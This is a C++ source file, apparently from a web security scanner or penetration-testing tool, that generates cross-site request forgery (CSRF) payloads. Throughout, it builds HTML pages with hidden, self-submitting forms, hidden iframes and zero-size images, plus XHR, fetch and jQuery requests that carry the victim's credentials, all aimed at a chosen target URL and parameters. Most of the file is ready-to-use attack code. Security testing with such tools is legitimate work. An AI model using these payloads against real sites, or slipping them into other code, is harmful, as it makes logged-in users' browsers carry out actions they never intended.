/**
 * CsrfPayloads.cpp
 * Implementación de payloads para detección y explotación de vulnerabilidades CSRF
 */

#include "CsrfPayloads.h"
#include <sstream>
#include <vector>
#include <string>
#include <map>

namespace BlackWidow {
namespace Security {
namespace Payloads {

std::vector<std::string> CsrfPayloads::getHtmlTemplates() {
    return {
        // Formulario básico con auto-submit
        "<html>\n"
        "  <body onload=\"document.forms[0].submit()\">\n"
        "    <form action=\"[TARGET_URL]\" method=\"POST\">\n"
        "      <input type=\"hidden\" name=\"[PARAM_NAME]\" value=\"[PARAM_VALUE]\" />\n"
        "      <input type=\"submit\" value=\"Submit\" />\n"
        "    </form>\n"
        "  </body>\n"
        "</html>",
        
        // Formulario con iframe oculto
        "<html>\n"
        "  <body>\n"
        "    <iframe style=\"display:none\" name=\"csrf-frame\"></iframe>\n"
        "    <form action=\"[TARGET_URL]\" method=\"POST\" target=\"csrf-frame\">\n"
        "      <input type=\"hidden\" name=\"[PARAM_NAME]\" value=\"[PARAM_VALUE]\" />\n"
        "      <input type=\"submit\" value=\"Submit\" />\n"
        "    </form>\n"
        "    <script>document.forms[0].submit();</script>\n"
        "  </body>\n"
        "</html>",
        
        // Formulario con imagen
        "<html>\n"
        "  <body>\n"
        "    <img src=\"x\" onerror=\"document.forms[0].submit();\">\n"
        "    <form action=\"[TARGET_URL]\" method=\"POST\">\n"
        "      <input type=\"hidden\" name=\"[PARAM_NAME]\" value=\"[PARAM_VALUE]\" />\n"
        "    </form>\n"
        "  </body>\n"
        "</html>",
        
        // GET CSRF con imagen
        "<img src=\"[TARGET_URL]?[PARAM_NAME]=[PARAM_VALUE]\" width=\"0\" height=\"0\" border=\"0\">",
        
        // GET CSRF con iframe
        "<iframe src=\"[TARGET_URL]?[PARAM_NAME]=[PARAM_VALUE]\" width=\"0\" height=\"0\" frameborder=\"0\"></iframe>"
    };
}

std::vector<std::string> CsrfPayloads::getJavaScriptTemplates() {
    return {
        // XMLHttpRequest básico
        "var xhr = new XMLHttpRequest();\n"
        "xhr.open('POST', '[TARGET_URL]', true);\n"
        "xhr.withCredentials = true;\n"
        "xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n"
        "xhr.send('[PARAM_NAME]=[PARAM_VALUE]');",
        
        // Fetch API
        "fetch('[TARGET_URL]', {\n"
        "  method: 'POST',\n"
        "  credentials: 'include',\n"
        "  headers: {\n"
        "    'Content-Type': 'application/x-www-form-urlencoded',\n"
        "  },\n"
        "  body: '[PARAM_NAME]=[PARAM_VALUE]'\n"
        "});",
        
        // jQuery
        "$.ajax({\n"
        "  url: '[TARGET_URL]',\n"
        "  type: 'POST',\n"
        "  xhrFields: {\n"
        "    withCredentials: true\n"
        "  },\n"
        "  data: {\n"
        "    '[PARAM_NAME]': '[PARAM_VALUE]'\n"
        "  }\n"
        "});",
        
        // Creación dinámica de formulario
        "var f = document.createElement('form');\n"
        "f.action = '[TARGET_URL]';\n"
        "f.method = 'POST';\n"
        "var i = document.createElement('input');\n"
        "i.type = 'hidden';\n"
        "i.name = '[PARAM_NAME]';\n"
        "i.value = '[PARAM_VALUE]';\n"
        "f.appendChild(i);\n"
        "document.body.appendChild(f);\n"
        "f.submit();"
    };
}

std::string CsrfPayloads::generateCsrfPayload(
    CsrfMethod method, 
    const std::string& targetUrl, 
    const std::map<std::string, std::string>& params
) {
    std::ostringstream payload;
    
    payload << "<html>\n"
            << "  <body>\n"
            << "    <form id=\"csrfForm\" action=\"" << targetUrl << "\" method=\"";
    
    // Establecer el método HTTP
    switch(method) {
        case CsrfMethod::POST:
            payload << "POST";
            break;
        case CsrfMethod::PUT:
            payload << "POST"; // HTML forms solo soportan GET/POST, usamos POST con _method para PUT
            break;
        case CsrfMethod::DELETE:
            payload << "POST"; // HTML forms solo soportan GET/POST, usamos POST con _method para DELETE
            break;
        default:
            payload << "GET";
            break;
    }
    
    payload << "\">\n";
    
    // Para PUT/DELETE, añadimos un campo _method
    if (method == CsrfMethod::PUT) {
        payload << "      <input type=\"hidden\" name=\"_method\" value=\"PUT\" />\n";
    } else if (method == CsrfMethod::DELETE) {
        payload << "      <input type=\"hidden\" name=\"_method\" value=\"DELETE\" />\n";
    }
    
    // Añadir todos los parámetros como campos ocultos
    for (const auto& param : params) {
        payload << "      <input type=\"hidden\" name=\"" << param.first << "\" value=\"" << param.second << "\" />\n";
    }
    
    payload << "      <input type=\"submit\" value=\"Submit Request\" />\n"
            << "    </form>\n"
            << "  </body>\n"
            << "</html>";
    
    return payload.str();
}

std::string CsrfPayloads::generateAutoSubmitPayload(
    CsrfMethod method, 
    const std::string& targetUrl, 
    const std::map<std::string, std::string>& params
) {
    std::ostringstream payload;
    
    payload << "<html>\n"
            << "  <body onload=\"document.getElementById('csrfForm').submit()\">\n"
            << "    <form id=\"csrfForm\" action=\"" << targetUrl << "\" method=\"";
    
    // Establecer el método HTTP
    switch(method) {
        case CsrfMethod::POST:
            payload << "POST";
            break;
        case CsrfMethod::PUT:
            payload << "POST"; // HTML forms solo soportan GET/POST, usamos POST con _method para PUT
            break;
        case CsrfMethod::DELETE:
            payload << "POST"; // HTML forms solo soportan GET/POST, usamos POST con _method para DELETE
            break;
        default:
            payload << "GET";
            break;
    }
    
    payload << "\" style=\"display:none\">\n";
    
    // Para PUT/DELETE, añadimos un campo _method
    if (method == CsrfMethod::PUT) {
        payload << "      <input type=\"hidden\" name=\"_method\" value=\"PUT\" />\n";
    } else if (method == CsrfMethod::DELETE) {
        payload << "      <input type=\"hidden\" name=\"_method\" value=\"DELETE\" />\n";
    }
    
    // Añadir todos los parámetros como campos ocultos
    for (const auto& param : params) {
        payload << "      <input type=\"hidden\" name=\"" << param.first << "\" value=\"" << param.second << "\" />\n";
    }
    
    payload << "    </form>\n"
            << "    <p>Esta página está realizando una petición automática. Si no eres redirigido, haz clic <a href='#' onclick='document.getElementById(\"csrfForm\").submit(); return false;'>aquí</a>.</p>\n"
            << "  </body>\n"
            << "</html>";
    
    return payload.str();
}

std::string CsrfPayloads::generateXhrPayload(
    CsrfMethod method, 
    const std::string& targetUrl, 
    const std::map<std::string, std::string>& params,
    bool withCredentials
) {
    std::ostringstream payload;
    std::ostringstream paramsStr;
    
    // Construir la cadena de parámetros
    bool first = true;
    for (const auto& param : params) {
        if (!first) {
            paramsStr << "&";
        }
        paramsStr << param.first << "=" << param.second;
        first = false;
    }
    
    // Generar el código JavaScript para XMLHttpRequest
    payload << "<script>\n"
            << "  var xhr = new XMLHttpRequest();\n"
            << "  xhr.open('";
    
    // Método HTTP
    switch(method) {
        case CsrfMethod::POST:
            payload << "POST";
            break;
        case CsrfMethod::PUT:
            payload << "PUT";
            break;
        case CsrfMethod::DELETE:
            payload << "DELETE";
            break;
        default:
            payload << "GET";
            break;
    }
    
    payload << "', '" << targetUrl << "', true);\n";
    
    // Configurar withCredentials si es necesario
    if (withCredentials) {
        payload << "  xhr.withCredentials = true;\n";
    }
    
    // Configurar cabeceras y enviar la petición
    if (method == CsrfMethod::GET) {
        payload << "  xhr.send();\n";
    } else {
        payload << "  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n"
                << "  xhr.send('" << paramsStr.str() << "');\n";
    }
    
    payload << "</script>";
    
    return payload.str();
}

std::string CsrfPayloads::generateFetchPayload(
    CsrfMethod method, 
    const std::string& targetUrl, 
    const std::map<std::string, std::string>& params,
    bool withCredentials
) {
    std::ostringstream payload;
    std::ostringstream paramsStr;
    
    // Construir la cadena de parámetros para GET
    if (method == CsrfMethod::GET) {
        bool first = true;
        for (const auto& param : params) {
            if (first) {
                paramsStr << "?";
            } else {
                paramsStr << "&";
            }
            paramsStr << param.first << "=" << param.second;
            first = false;
        }
    }
    
    // Generar el código JavaScript para Fetch API
    payload << "<script>\n"
            << "  fetch('" << targetUrl;
    
    // Para GET, añadir los parámetros a la URL
    if (method == CsrfMethod::GET) {
        payload << paramsStr.str();
    }
    
    payload << "', {\n"
            << "    method: '";
    
    // Método HTTP
    switch(method) {
        case CsrfMethod::POST:
            payload << "POST";
            break;
        case CsrfMethod::PUT:
            payload << "PUT";
            break;
        case CsrfMethod::DELETE:
            payload << "DELETE";
            break;
        default:
            payload << "GET";
            break;
    }
    
    payload << "',\n";
    
    // Configurar credentials si es necesario
    if (withCredentials) {
        payload << "    credentials: 'include',\n";
    } else {
        payload << "    credentials: 'omit',\n";
    }
    
    // Para métodos distintos a GET, añadir el cuerpo de la petición
    if (method != CsrfMethod::GET) {
        payload << "    headers: {\n"
                << "      'Content-Type': 'application/x-www-form-urlencoded',\n"
                << "    },\n";
        
        // Construir el cuerpo de la petición
        payload << "    body: '";
        bool first = true;
        for (const auto& param : params) {
            if (!first) {
                payload << "&";
            }
            payload << param.first << "=" << param.second;
            first = false;
        }
        payload << "'\n";
    }
    
    payload << "  });\n"
            << "</script>";
    
    return payload.str();
}

} // namespace Payloads
} // namespace Security
} // namespace BlackWidow